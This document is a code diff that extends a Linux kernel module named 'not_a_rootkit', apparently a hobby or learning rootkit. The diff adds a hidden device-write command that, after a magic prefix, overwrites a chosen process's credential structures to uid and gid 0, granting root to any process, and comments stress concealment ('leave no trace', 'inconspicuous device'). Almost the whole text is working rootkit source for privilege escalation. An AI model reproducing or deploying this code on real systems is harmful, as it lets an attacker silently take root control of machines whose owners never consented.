@@ -11,6 +11,10 @@
 #include <linux/device.h>		/* for class/device creation */
 #include <linux/slab.h>			/* for kernel memory allocation */
 #include <linux/string.h>		/* for string functions */
+#include <linux/cred.h>				/* for credential structures */
+#include <linux/sched.h>		/* for task and pid related operations */
+#include <asm/current.h>		/* for definition of 'current' (the current task) */
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("me");
@@ -24,12 +28,15 @@ static int trivial_open(struct inode *, struct file *);
 static int trivial_close(struct inode *, struct file *);
 static ssize_t trivial_write(struct file *, const char *, size_t, loff_t *);
 static ssize_t trivial_read(struct file *, char *, size_t, loff_t *);
-
+static struct task_struct *find_task_from_pid(int);
+static void root_creds(struct cred *);
+static void give_root(int);
 
 /* useful defines */
-#define DEVICE_NAME "not_a_rootkit"		// name appears in /proc/devices
-#define CLASS_NAME 	"not_a"
-#define SUCCESS		0
+#define DEVICE_NAME 		"not_a_rootkit"		// name appears in /proc/devices
+#define CLASS_NAME 			"not_a"
+#define SUCCESS				0
+#define ASCIINUM_TO_DEC(x)	(x-48)				// conversion from ascii to decimal
 
 /* globals (within this file) */
 static int majorNum;					// device major number assigned
@@ -127,9 +134,16 @@ static ssize_t trivial_write(struct file *f, const char *buff, size_t len, loff_
 	if (memcmp(privBuf, magic, 3) == SUCCESS) {
 		cmdPtr = &buff[3];			// cmdPtr should now be the given command
 
-		/* TODO: place our if/elseif strcmp tower here for future commands */
-		printk(KERN_INFO "ROOTKIT: You issued a command!\n");
+		/* case root access to a process- number after command indicates pid, 0 indicates itself */
+		if (strncmp(cmdPtr, "root", 4) == SUCCESS) {
+			int pid = cmdPtr[4];
+			if (pid != '\0') {
+				pid = ASCIINUM_TO_DEC(pid);
+				give_root(pid);
+			}
+			
 
+		}
 	}
 	kfree(privBuf);		// leave no trace
 	return len;
@@ -143,6 +157,49 @@ static ssize_t trivial_read(struct file *f, char *buff, size_t length, loff_t *o
 	printk(KERN_INFO "Read performed on inconspicuous device\n");
 	return 0;		// signal EOF for now
 }
+
+/* return the task struct associated with a given pid, or NULL on fail */
+static struct task_struct *find_task_from_pid(int pid) {
+	struct pid *task_pid;
+	task_pid = find_vpid(pid);
+	if (task_pid == NULL) {
+		return NULL;
+	}
+	/* use the pid struct to find the task struct */
+	struct task_struct *task;
+	task = pid_task(task_pid, PIDTYPE_PID);
+	return task;
+}
+
+static void root_creds(struct cred *c) {
+	c->uid.val = 0;
+	c->gid.val = 0;
+	c->euid.val = 0;
+	c->egid.val = 0;
+	c->suid.val = 0;
+	c->sgid.val = 0;
+	c->fsuid.val = 0;
+	c->fsgid.val = 0;
+}
+
+/* 
+ * give root privileges to the process with given pid
+ * a pid of 0 will give root to the current process 
+ */
+static void give_root(int pid) {
+	struct task_struct *task;
+	if (pid == 0) {
+		task = current;
+	} else {
+		task = find_task_from_pid(pid);
+		if (task == NULL) {
+			return;
+		}
+	}
+	root_creds(task->cred);
+	root_creds(task->real_cred);
+}
+
 
 /* must call these and pass in our init/exit functions */
 module_init(trivial_init);
